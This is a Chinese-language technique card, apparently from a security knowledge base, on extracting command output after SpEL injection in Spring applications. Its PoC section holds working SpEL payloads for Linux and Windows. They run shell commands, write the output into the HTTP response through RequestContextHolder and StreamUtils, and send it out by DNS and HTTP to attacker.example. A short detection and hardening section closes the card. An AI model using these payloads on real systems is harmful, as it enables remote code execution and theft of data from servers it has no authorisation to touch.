---
id: web-java-expression-spel-no-echo-exfil-streamutils
title: SpEL 无回显注入：Scanner 读进程输出、StreamUtils 写响应与 DNS/HTTP 外带
type: scenario
domain: web
path: web/java/expression/spel
technique: spel-no-echo-exfiltration
aliases:
- SpEL 回显
- RequestContextHolder 回显
- StreamUtils.copy 回显
- SpEL 无回显外带
- Scanner 读取 exec 输出
tags:
- spel
- rce
- exfiltration
- echo
- requestcontextholder
- spring
- java
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:09:43+08:00'
  notes: 原文无图片，已核对回显链：Scanner(process.getInputStream()).useDelimiter('\A').next()、RequestContextHolder.currentRequestAttributes().getResponse().getOutputStream() + StreamUtils.copy、DNS/HTTP 外带均为标准可行写法；卡中已纠正原文“InputStream 直接传 String 构造器”的错误。DNS/HTTP 输出受字符集/长度限制的注意事项已写入。原文未涉及版本区间。未执行 PoC。
---

## 一句话结论

SpEL 命令执行没有直接返回值时，可以用 `Scanner` 把 `Process` 的标准输出读成字符串、用 `StreamUtils.copy` 把进程输出直接写进当前 `HttpServletResponse`，或通过 DNS/HTTP 请求把数据外带到攻击者服务器。

## 原理

- `Runtime.exec()` 返回 `Process`，命令输出在 `Process#getInputStream()` 中，本身不会出现在表达式返回值里。`new java.util.Scanner(process.getInputStream()).useDelimiter('\\A').next()` 把整个流读成一个字符串，等价于读取命令输出。
- Spring MVC 在请求线程上用 `RequestContextHolder` 的 `ThreadLocal<RequestAttributes>` 保存当前请求上下文。SpEL 中 `T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse()` 可拿到当前 `HttpServletResponse`，再 `getOutputStream()` 取得原始响应流。
- `T(org.springframework.util.StreamUtils).copy(inputStream, outputStream)` 把进程标准输出逐字节复制到 HTTP 响应流，不依赖 Controller 的返回类型，也不依赖表达式结果被渲染。
- 没有响应对象或响应已被提交时，可用外带：`T(java.net.InetAddress).getByName(host)` 触发 DNS 查询（数据编码进子域名），或 `new java.net.URL(url).openStream()` 发起 HTTP 请求（数据放在路径/参数）。
- 错误输出默认不在标准输出中，需要 `2>&1`、`redirectErrorStream(true)` 或在 shell 中重定向；否则只能拿到标准输出。

## 触发条件

- 已通过 SpEL 注入执行命令（见核心卡）。
- 回显路径要求当前线程处于 Spring MVC 请求处理中，且 `RequestContextHolder` 可访问；`StreamUtils` 在 classpath（Spring 应用通常具备）。
- 外带路径要求目标能出网（DNS 或 HTTP），且出站未被完全阻断。
- Scanner 路径要求表达式结果会被返回/渲染，或能通过异常消息带出。

## 利用步骤

1. 先确认命令是否执行：用 `T(java.lang.Thread).sleep(5000)` 或写文件观察延时/副作用。
2. 有表达式返回值时，用 Scanner 读取输出并作为结果返回。
3. 无返回值时，尝试 `RequestContextHolder` 取响应流，用 `StreamUtils.copy` 直接写响应；先写一个固定字符串验证通道。
4. 若响应流不可用，改用 DNS/HTTP 外带；先用固定域名验证出网，再把命令输出编码进子域名或 URL 路径。
5. 命令含特殊字符时用参数数组或 Base64 包装，避免 shell 解析问题。

## PoC

Scanner 读取命令输出（Linux）：

```text
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'/bin/sh','-c','id'}).getInputStream()).useDelimiter('\\A').next()
```

Windows：

```text
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'cmd','/c','whoami'}).getInputStream()).useDelimiter('\\A').next()
```

合并错误输出：

```text
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'/bin/sh','-c','id 2>&1'}).getInputStream()).useDelimiter('\\A').next()
```

StreamUtils + RequestContextHolder 直接写响应：

```text
T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'/bin/sh','-c','id'}).getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())
```

先验证响应通道（写响应头，不依赖返回值）：

```text
T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().addHeader('X-Test','success')
```

DNS 外带（把命令输出拼进子域名；先读成字符串再拼接）：

```text
T(java.net.InetAddress).getByName(new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'/bin/sh','-c','whoami'}).getInputStream()).useDelimiter('\\A').next()+'.attacker.example')
```

HTTP 外带：

```text
new java.net.URL('http://attacker.example/?d='+new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'/bin/sh','-c','id'}).getInputStream()).useDelimiter('\\A').next()).openStream()
```

## 变体与关联

- 变体：`ProcessBuilder.redirectErrorStream(true)` 合并标准输出与错误输出。
- 变体：通过抛异常把结果放进异常消息（依赖全局异常处理是否回显）。
- 变体：把命令输出写入 Web 可访问目录，再通过 HTTP 读取。
- 变体：DNS 外带受域名长度/字符集限制时，先 Base64/Hex 编码再拼子域名。
- 关联：[[web-java-expression-spel-injection-to-rce]]（基础注入与命令执行）。
- 关联：[[web-java-expression-spel-waf-bypass-scriptengine-reflection]]（过滤环境下的执行）。
- 注意：常见错误写法是把 `InputStream` 直接传给 `new String(...)`，Java 中不存在该构造器，不能照抄；本卡改为先用 Scanner 读成字符串再拼接。外带 payload 还要求目标出网，内网环境应优先尝试响应流回显。

## 检测与防御

- 修复：按核心卡修复 SpEL 注入；仅靠过滤输出关键字不能阻止外带。
- 加固：Web 进程禁止主动外连（出站白名单），限制 DNS 解析到非业务域名；对 `InetAddress.getByName`、`URL.openStream`、`Socket` 等网络调用做运行时监控。
- 加固：限制 `RequestContextHolder`、`StreamUtils` 在表达式上下文中的可见性（`SimpleEvaluationContext` 下通常不可达）。
- 检测：请求参数中出现 `RequestContextHolder`、`getResponse()`、`StreamUtils`、`Scanner`、`useDelimiter`、`InetAddress`、`openStream`、`getInputStream` 等特征。
- 检测：响应中出现异常的命令输出、响应头被意外添加、响应状态被修改；DNS 日志出现长随机子域名或异常查询；出站 HTTP 请求携带命令输出特征。
